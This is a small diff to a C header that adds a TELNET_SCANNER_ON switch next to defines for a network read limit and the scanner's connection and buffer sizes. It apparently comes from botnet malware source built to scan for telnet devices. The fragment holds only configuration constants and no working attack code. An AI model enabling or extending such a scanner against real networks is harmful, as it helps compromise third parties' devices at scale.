@@ -16,6 +16,8 @@
 // Defines a read limit from the network.
 #define ENV_NETWORK_READ_MAX 100240
 
+// Comment-out in order to disable the telnet scanner.
+#define TELNET_SCANNER_ON
 // Telnet scanner.
 #define SCANNER_MAX_CONNS 128
 #define SCANNER_RDBUF_SIZE 256
